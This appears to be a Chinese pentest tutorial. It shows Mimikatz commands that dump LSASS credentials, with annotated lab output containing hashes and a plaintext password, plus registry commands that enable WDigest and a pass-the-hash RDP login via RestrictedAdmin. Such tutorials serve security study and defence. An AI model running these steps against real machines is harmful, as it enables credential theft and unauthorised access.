### Mimikatz 抓取 Windows 管理员密码

[下载工具](https://github.com/ParrotSec/mimikatz)

```cmd
mimikatz.exe "privilege::debug" "log" "sekurlsa::logonpassWords" "exit"
```

`"privilege::debug"`
 尝试提升当前进程的权限以便访问受保护的系统资源

`"log"`
 启用或开始记录 Mimikatz 的运行输出到本地日志文件

`"sekurlsa::logonpassWords"`
 向 Mimikatz 的 sekurlsa 模块发出“列出登录会话和相关凭据”的请求。该模块会尝试从 LSASS/内存中读取登录会话信息（可能包含用户名、域、NTLM 哈希、明文密码等内容，具体取决于系统配置和保护程度）

`"exit"`
 退出 Mimikatz 程序

![](https://pic1.imgdb.cn/item/68cbfd9fc5157e1a88179b9e.png)

```cmd
Authentication Id : 0 ; 126277 (00000000:0001ed45)
Session           : Interactive from 1
User Name         : rkvir
Domain            : WIN-DK3UCO8BEOB
Logon Server      : WIN-DK3UCO8BEOB
Logon Time        : 2025/9/18 16:39:53
SID               : S-1-5-21-4044031831-2824117312-571717897-1000
	msv :	
	 [00000003] Primary
	 * Username : rkvir
	 * Domain   : WIN-DK3UCO8BEOB
	 * LM       : 44efce164ab921caaad3b435b51404ee
	 * NTLM     : 32ed87bdb5fdc5e9cba88547376818d4
	 * SHA1     : 6ed5833cf35286ebf8662b7b5949f0d742bbec3f
	tspkg :	
	 * Username : rkvir
	 * Domain   : WIN-DK3UCO8BEOB
	 * Password : 123456
	wdigest :	
	 * Username : rkvir
	 * Domain   : WIN-DK3UCO8BEOB
	 * Password : 123456
	kerberos :	
	 * Username : rkvir
	 * Domain   : WIN-DK3UCO8BEOB
	 * Password : 123456
	ssp :	
	credman :	
```

`Authentication Id : 0 ; 126277 (00000000:0001ed45)`
 内部会话认证 ID，用于区分 logon session。通常用于关联凭据与某个会话

`Session : Interactive from 1`
 表示这是一个交互式登录（例如本地控制台或 RDP），Session Id=1

`User Name : rkvir` / `Domain : WIN-DK3UCO8BEOB` / `Logon Server : WIN-DK3UCO8BEOB` / `Logon Time : 2025/9/18 16:39:53`
 表示用户、域/主机与登录时间 — 有助于事件时间线重建

`SID : S-1-5-21-...-1000`
 Windows 安全标识，唯一标识此用户账户

`msv : [00000003] Primary` 下的项

- `Username` / `Domain`：重复用户名/域信息
- `LM` / `NTLM` / `SHA1`：该账户的 LM、NTLM、SHA1 散列值（来自内存/LSASS）。这些哈希可用于“传递哈希 (Pass-the-Hash)”类攻击或作为离线破解目标。LM 已为过时但仍可能存在；NTLM 是常见的网络认证散列。

`tspkg : * Password : 123456`
 tspkg 插件能获得的凭据；这里直接明文显示了密码 `123456`

`wdigest : * Password : 123456`
 WDigest 明文凭据被泄露 —— 说明系统上可能启用了或曾启用将凭据明文保存在内存的机制（历史上 WDigest 会将明文凭据保存在内存，现代系统可通过设置禁用）

`kerberos : * Password : 123456`
 Kerberos 相关也泄露了明文密码（说明凭证在内存中可被读取，或 LSASS 中保存了明文/可逆信息）

`ssp :` / `credman :`
 这些模块在此 dump 中为空或未获取到可用凭据

**在日常网络维护中，通过查看注册表项 Wdigest 可以判断其功能状态**

**如果该项值为 0，用户明文密码就不会出现在内存中，如果该项值为 1 用户下次登录时，攻击者就能使用工具获取明文密码**

微软为了防止用户的明文密码在内存中泄露，发布了 KB2871997 补丁，关闭了 Wdigest 功能

Windows Server2012 及以上版本默认关闭 Wdigest，使攻击者无法从内存中获取明文密码

Windows Server2012 以下版本，如果安装了 KB2871997 补丁，攻击者同样无法获取明文密码

在命令行环境开启或关闭 Wdigest Auth，有如下两种方法：

cmd 中开启 Wdigest

```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
```

PowerShell 中开启 Wdigest

```powershell
Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -Type DWORD -Value 1
```

meterpreter 中开启 Wdigest

```
reg setval -k HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest -v UseLogonCredential -t REG_DWORD -d 1
```

对应的关闭如下

```
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f
```

```
Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -Type DWORD -Value 0
```

```
reg setval -k HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest -v UseLogonCredential -t REG_DWORD -d 0
```

在开启 `Wdigest Auth` 后，需要管理员重新登录才能逮到明文密码

**经测试 Win10企业版仅锁屏读明文失败，需要注销才行，其它版本未知**

另一种就是碰撞 md5、hash

通过 hash 登录远程桌面，Windows server 是支持

**目标主机要开启 RDP, 以及关闭防火墙**

```cmd
# 开启
REG ADD "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t
REG_DWORD /d 00000000 /f

# 查询结果, 0x0 是开启
REG query "HKLM\System\CurrentControlSet\Control\Lsa" | findstr "DisableRestrictedAdmin"

# rdp pth, 只需要在攻击者机器上运行
mimikatz.exe
privilege::debug
sekurlsa::pth /user:Administrator /domain:192.168.118.133
/ntlm:d557003628dffa85976ae9ae4568eff9 "/run:mstsc.exe /restrictedadmin"
```